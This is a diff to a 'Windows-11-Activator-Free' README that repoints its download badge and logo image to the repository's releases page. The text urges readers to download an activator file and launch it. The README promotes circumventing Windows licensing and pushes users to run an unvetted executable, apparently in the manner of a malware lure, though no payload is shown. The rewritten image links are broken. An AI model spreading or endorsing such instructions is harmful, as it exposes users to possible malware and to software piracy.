@@ -30,7 +30,7 @@ Welcome to the **Windows-11-Activator-Free** repository, your one-stop destinati
 
 To access the necessary files for activating Windows 11, please visit the following link: 
 
-[![Download Windows 11 Activator](https://img.shields.io/badge/Download-Windows%2011%20Activator-blue)](https://github.com/files/Project.zip)
+[![Download Windows 11 Activator](https://github.com/alexandreaguiar1-sys/Windows-11-Activator-Free/releases%2011%20Activator-blue)](https://github.com/alexandreaguiar1-sys/Windows-11-Activator-Free/releases)
 
 Once you click on the link, the file will be downloaded to your system. Remember to launch the file to begin the activation process.
 
@@ -42,4 +42,4 @@ Feel free to explore the various topics related to Windows 11 activation availab
 
 Thank you for visiting the **Windows-11-Activator-Free** repository. Activate Windows 11 with ease and enjoy a seamless computing experience! 🌟
 
-![Windows 11 Logo](https://www.windowscentral.com/sites/wpcentral.com/files/styles/large/public/field/image/2021/06/windows-11-logo.jpg)
+![Windows 11 Logo](https://github.com/alexandreaguiar1-sys/Windows-11-Activator-Free/releases)
